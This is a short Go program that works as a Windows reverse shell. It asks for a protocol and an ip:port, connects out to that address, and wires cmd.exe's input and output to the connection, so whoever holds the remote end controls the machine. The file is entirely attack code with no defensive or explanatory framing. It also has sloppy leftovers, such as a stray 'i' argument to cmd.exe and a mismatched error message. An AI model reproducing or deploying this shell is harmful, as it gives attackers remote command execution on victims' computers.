package main

import (
	"fmt"
	"net"
	"io"
	"log"
	"os/exec"
)

func main() {
	// declare variables                                                   	 
	var proto, ip_port string
	fmt.Print("Enter protocol and ip:port ")                                           	 
	// Get inputs a and b from user via keyboard                           	 
	fmt.Scanf("%s", &proto)                                                    	 
	fmt.Scanf("%s", &ip_port)
	conn, err := net.Dial(proto, ip_port)
		if err != nil {
			log.Fatalln("Unable to bind port")
		}
		cmd := exec.Command("cmd.exe", "i")
		// Set stdin to our connection
		rp, wp := io.Pipe()
		cmd.Stdin = conn
		cmd.Stdout = wp
		go io.Copy(conn, rp)
		cmd.Run()
		conn.Close() 
	}
